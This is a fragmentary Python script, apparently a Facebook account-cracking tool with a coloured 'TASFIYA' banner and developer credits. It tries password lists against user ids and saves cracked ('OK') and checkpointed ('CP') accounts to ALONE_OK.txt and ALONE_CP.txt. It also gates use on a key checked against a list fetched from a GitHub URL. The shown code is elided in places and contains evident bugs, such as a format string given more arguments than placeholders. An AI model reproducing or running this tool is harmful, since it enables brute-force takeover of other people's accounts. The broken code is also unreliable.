...
colouroff="\x1b[00m"
logo=""" 
\033[1;91m   _______        _____ ______ _______     __      
\033[1;93m  |__   __|/\    / ____|  ____|_   _\ \   / //\    
\033[1;93m     | |  /  \  | (___ | |__    | |  \ \_/ //  \   
  \033[1;92m   | | / /\ \  \___ \|  __|   | |   \   // /\ \  
 \033[1;91m    | |/ ____ \ ____) | |     _| |_   | |/ ____ \ 
\033[1;91m     |_/_/    \_\_____/|_|    |_____|  |_/_/    \_\
                                                  
                                                  


\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            MD JAHIDUL ISLAM
     \033[1;91m➣ \033[1;91mFACEBOOK   :            MD JAHIDUL ISLAM
     \033[1;92m➣ \033[1;92mWHATSAPP   :            ***********
     \033[1;91m➣ \033[1;91mGITHUB     :            JAHID-143
...
a=requests.get("https://raw.githubusercontent.com/ALONE-143/apporved/main/250%20Tool").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mALONE_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mALONE_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back ALONE Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[ALONE-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    'accept-language': 'en-IN,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;31m\r                THIS TOOL WIFI  DATA USER\033[1;37m")
            print("\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
